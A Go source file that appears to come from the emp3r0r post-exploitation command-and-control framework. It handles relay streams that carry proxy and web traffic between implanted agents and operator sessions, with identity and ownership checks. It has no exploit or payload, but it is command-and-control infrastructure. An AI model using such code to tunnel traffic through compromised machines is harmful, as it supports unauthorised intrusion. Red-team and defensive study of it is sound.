package server

import (
	"context"
	"fmt"
	"io"
	"strconv"
	"strings"
	"sync"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

type relayStream struct {
	ownerSession string
	conn         io.ReadWriteCloser
	writeMu      sync.Mutex
	done         chan struct{}
	doneOnce     sync.Once
}

func (rs *relayStream) signalDone() {
	if rs == nil || rs.done == nil {
		return
	}
	rs.doneOnce.Do(func() {
		close(rs.done)
	})
}

var (
	proxyRelayStreams sync.Map // map[token]*relayStream
	wwwRelayStreams   sync.Map // map[streamID]*relayStream
)

func verifyAuxRouteAgent(agentUUID, remoteAddr, route string) bool {
	if agentUUID == "" {
		logging.Errorf("%s relay: blocked stream from %s with empty agentUUID", route, remoteAddr)
		return false
	}
	if agents.AgentDB == nil {
		logging.Errorf("%s relay: AgentDB unavailable for %s from %s", route, strconv.Quote(agentUUID), remoteAddr)
		return false
	}
	pinnedKey, _, found, lookupErr := agents.GetPinnedIdentity(agentUUID)
	if lookupErr != nil {
		logging.Errorf("CRITICAL: %s relay: AgentDB lookup failed for %s from %s: %v", route, strconv.Quote(agentUUID), remoteAddr, lookupErr)
		return false
	}
	if !found || pinnedKey == "" {
		logging.Errorf("CRITICAL: %s relay: agent %s not enrolled or has empty pinned key from %s", route, strconv.Quote(agentUUID), remoteAddr)
		return false
	}
	_ = agents.UpdateSessionHeartbeat(agentUUID)
	return true
}

func handleProxyRelayStream(conn io.ReadWriteCloser, agentUUID, streamID, remoteAddr string, cancel context.CancelFunc) {
	if !verifyAuxRouteAgent(agentUUID, remoteAddr, "proxy") {
		cancel()
		conn.Close()
		return
	}
	streamID = strings.TrimSpace(streamID)
	if streamID == "" {
		logging.Errorf("CRITICAL: proxy relay: empty stream id from %s", remoteAddr)
		cancel()
		conn.Close()
		return
	}

	token := streamID
	if strings.Contains(token, "_") {
		token = strings.SplitN(token, "_", 2)[0]
	}
	val, ok := network.PortFwds.Load(token)
	if !ok {
		logging.Errorf("CRITICAL: proxy relay: unknown token %q from %s", token, remoteAddr)
		cancel()
		conn.Close()
		return
	}
	pf, ok := val.(*network.PortFwdSession)
	if !ok || pf == nil || pf.OperatorSession == "" {
		logging.Errorf("CRITICAL: proxy relay: token %q missing owner operator", token)
		cancel()
		conn.Close()
		return
	}
	owner := pf.OperatorSession

	rs := &relayStream{ownerSession: owner, conn: conn}
	proxyRelayStreams.Store(streamID, rs)
	defer proxyRelayStreams.Delete(streamID)
	defer func() {
		_ = fwdMsgToOperator(owner, def.MsgTunData{Tag: def.TagProxyRelayDonePrefix + streamID})
		cancel()
		_ = conn.Close()
	}()

	buf := make([]byte, 64*1024)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			chunk := make([]byte, n)
			copy(chunk, buf[:n])
			msg := def.MsgTunData{Tag: def.TagProxyRelayDataPrefix + streamID, Response: chunk}
			if sendErr := fwdMsgToOperator(owner, msg); sendErr != nil {
				logging.Errorf("CRITICAL: proxy relay: forwarding chunk failed for %q: %v", streamID, sendErr)
				return
			}
		}
		if err != nil {
			if err != io.EOF {
				_ = fwdMsgToOperator(owner, def.MsgTunData{Tag: def.TagProxyRelayErrorPrefix + streamID, Response: []byte(err.Error())})
			}
			return
		}
	}
}

func handleWWWRelayStream(conn io.ReadWriteCloser, agentUUID, streamID, remoteAddr string) {
	if !verifyAuxRouteAgent(agentUUID, remoteAddr, "www") {
		conn.Close()
		return
	}
	streamID = strings.TrimSpace(streamID)
	if streamID == "" {
		logging.Errorf("CRITICAL: www relay: empty stream id from %s", remoteAddr)
		conn.Close()
		return
	}

	ownerSession, err := getOnlyOperatorSession()
	if err != nil {
		logging.Errorf("CRITICAL: www relay: %v", err)
		conn.Close()
		return
	}

	rs := &relayStream{ownerSession: ownerSession, conn: conn, done: make(chan struct{})}
	wwwRelayStreams.Store(streamID, rs)
	defer wwwRelayStreams.Delete(streamID)
	defer conn.Close()

	if err := fwdMsgToOperator(ownerSession, def.MsgTunData{Tag: def.TagWWWRelayRequestPrefix + streamID}); err != nil {
		logging.Errorf("CRITICAL: www relay: request forwarding failed for %q: %v", streamID, err)
		return
	}

	// Keep this stream alive until operator finishes or errors; otherwise agent receives EOF with empty body.
	<-rs.done
}

func getOnlyOperatorSession() (string, error) {
	count := 0
	session := ""
	OPERATORS.Range(func(key, _ any) bool {
		count++
		session, _ = key.(string)
		return true
	})
	if count != 1 || session == "" {
		return "", fmt.Errorf("www relay requires exactly one active operator session (have %d)", count)
	}
	return session, nil
}

func handleOperatorRelayFrame(operatorSession string, msg *def.MsgTunData) {
	if msg == nil {
		return
	}
	tag := msg.Tag
	switch {
	case strings.HasPrefix(tag, def.TagProxyRelayBackPrefix):
		streamID := strings.TrimPrefix(tag, def.TagProxyRelayBackPrefix)
		if val, ok := proxyRelayStreams.Load(streamID); ok {
			rs := val.(*relayStream)
			if rs.ownerSession != operatorSession {
				logging.Errorf("CRITICAL: proxy relay owner mismatch for %q", streamID)
				return
			}
			rs.writeMu.Lock()
			_, _ = rs.conn.Write(msg.Response)
			rs.writeMu.Unlock()
		}
	case strings.HasPrefix(tag, def.TagProxyRelayDonePrefix):
		streamID := strings.TrimPrefix(tag, def.TagProxyRelayDonePrefix)
		if val, ok := proxyRelayStreams.Load(streamID); ok {
			rs := val.(*relayStream)
			if rs.ownerSession == operatorSession {
				_ = rs.conn.Close()
			}
		}
	case strings.HasPrefix(tag, def.TagWWWRelayDataPrefix):
		streamID := strings.TrimPrefix(tag, def.TagWWWRelayDataPrefix)
		if val, ok := wwwRelayStreams.Load(streamID); ok {
			rs := val.(*relayStream)
			if rs.ownerSession != operatorSession {
				logging.Errorf("CRITICAL: www relay owner mismatch for %q", streamID)
				return
			}
			rs.writeMu.Lock()
			_, err := rs.conn.Write(msg.Response)
			rs.writeMu.Unlock()
			if err != nil {
				logging.Errorf("CRITICAL: www relay write failed for %q: %v", streamID, err)
				wwwRelayStreams.Delete(streamID)
				rs.signalDone()
				_ = rs.conn.Close()
			}
		}
	case strings.HasPrefix(tag, def.TagWWWRelayDonePrefix):
		streamID := strings.TrimPrefix(tag, def.TagWWWRelayDonePrefix)
		if val, ok := wwwRelayStreams.LoadAndDelete(streamID); ok {
			rs := val.(*relayStream)
			if rs.ownerSession == operatorSession {
				rs.signalDone()
				_ = rs.conn.Close()
			}
		}
	case strings.HasPrefix(tag, def.TagWWWRelayErrorPrefix):
		streamID := strings.TrimPrefix(tag, def.TagWWWRelayErrorPrefix)
		logging.Errorf("WWW relay failed for %q: %s", streamID, string(msg.Response))
		if val, ok := wwwRelayStreams.LoadAndDelete(streamID); ok {
			rs := val.(*relayStream)
			if rs.ownerSession == operatorSession {
				rs.signalDone()
				_ = rs.conn.Close()
			}
		}
	}
}
